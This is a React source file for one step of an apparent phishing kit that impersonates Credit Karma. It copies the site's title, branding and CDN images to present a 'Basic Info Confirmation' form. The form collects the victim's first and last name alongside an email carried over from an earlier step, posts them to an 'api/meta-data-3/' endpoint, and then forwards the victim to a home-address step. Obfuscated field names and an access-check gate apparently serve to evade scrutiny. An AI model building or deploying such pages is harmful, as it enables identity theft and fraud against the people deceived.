import React, { useCallback, useEffect, useState } from 'react';
import { Link, useLocation, useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { baseUrl } from '../../constants';
import useAccessCheck from '../../utils/useAccessCheck';
import MetaTags from '../../utils/MetaTags';

const BIn: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const [errors, setErrors] = useState({ fzNme: '', lzNme: '' });

  const location = useLocation();
  const { emzemz } = location.state || {}; // Access the email passed in state

  const navigate = useNavigate();


  const isAllowed = useAccessCheck(baseUrl); // Replace with actual base URL
  if (!isAllowed) return null; // Or show a loading spinner, etc.





  const handleSubmit = async (event) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { fzNme: '', lzNme: '' };



    if (fzNme.length <= 0) {
      newErrors.fzNme = 'First name must be at least 4 characters.';
      setIsLoading(false);
    }



    if (lzNme.length <= 0) {
      newErrors.lzNme = 'Last name must be at least 4 characters.';
      setIsLoading(false);
    }



    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.fzNme && !newErrors.lzNme) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, fzNme, lzNme });

      const url = `${baseUrl}api/meta-data-3/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          fzNme: fzNme,
          lzNme: lzNme,
        });
        console.log('Message sent successfully');
        navigate('/home-address', { state: { emzemz } });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ fzNme: '', lzNme: '' });
    }
  };



  return (
    <>
      <MetaTags title="Basic Info - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />{' '}
      {/* Add this component to set the meta tags */}
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      {<Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />}
      <section>
        <div className="grid grid-cols-1 gap-4">
          <div className="px-10 pt-4">
            <h1 className="text-3xl font-extrabold mb-6">
              Basic Info Confirmation
            </h1>

            <div className="flex items-center gap-3 text-sm font-bold mt-2 mb-2">


              <p className="">
                We will need you to confirm your personal information.
              </p>
            </div>

            <form onSubmit={handleSubmit}>
              <div>
                <div className="mb-5">
                  <label className="mb-2.5 block font-medium text-black dark:text-white">
                    First Name
                  </label>

                  <div className="relative">
                    <input
                      id="fzNme"
                      name="fzNme"
                      type="text"
                      value={fzNme}
                      onChange={(e) => setFzNme(e.target.value)}
                      className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                    />
                  </div>
                </div>

                {errors.fzNme && (
                  <div className="flex items-center gap-3 text-sm font-bold mb-4">
                    <svg
                      width="1rem"
                      height="1rem"
                      viewBox="0 0 24 24"
                      className="fill-current text-red-600"
                      aria-hidden="true"
                    >
                      <path
                        d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                        fillRule="nonzero"
                      ></path>
                    </svg>

                    <p>First Name required</p>
                  </div>
                )}
              </div>


              <div>
                <div className="mb-5">
                  <label className="mb-2.5 block font-medium text-black dark:text-white">
                    Last Name
                  </label>

                  <div className="relative">
                    <input
                      id="lzNme"
                      name="lzNme"
                      type="text"
                      value={lzNme}
                      onChange={(e) => setLzNme(e.target.value)}
                      className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                    />
                  </div>
                </div>

                {errors.lzNme && (
                  <div className="flex items-center gap-3 text-sm font-bold mb-5">
                    <svg
                      width="1rem"
                      height="1rem"
                      viewBox="0 0 24 24"
                      className="fill-current text-red-600"
                      aria-hidden="true"
                    >
                      <path
                        d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                        fillRule="nonzero"
                      ></path>
                    </svg>

                    <p>Last Name required</p>
                  </div>
                )}
              </div>


              <div className="mb-10 flex items-center justify-center">
                {!isLoading ? (
                  <input
                    type="submit"
                    value="Continue"
                    className="w-full cursor-pointer font-bold rounded-md border border-primary bg-primary p-3 text-white transition hover:bg-opacity-90"
                  />
                ) : (
                  <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-primary border-t-transparent"></div>
                )}
              </div>



            </form>
          </div>

          <div className="bg-pink p-3">
            <img
              srcset="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=1 1x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=2 2x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=3 3x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=4 4x"
              src="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat"
              alt=""
              width="500"
              height="Auto"
            />

            <div className="text-center">
              <h1 className="text-3xl font-extrabold mb-3">
                Create your own karma.
              </h1>

              <p>Download our app to see what’s new.</p>
            </div>
          </div>
        </div>
      </section>

      <Footer />
    </>
  );
};

export default BIn;
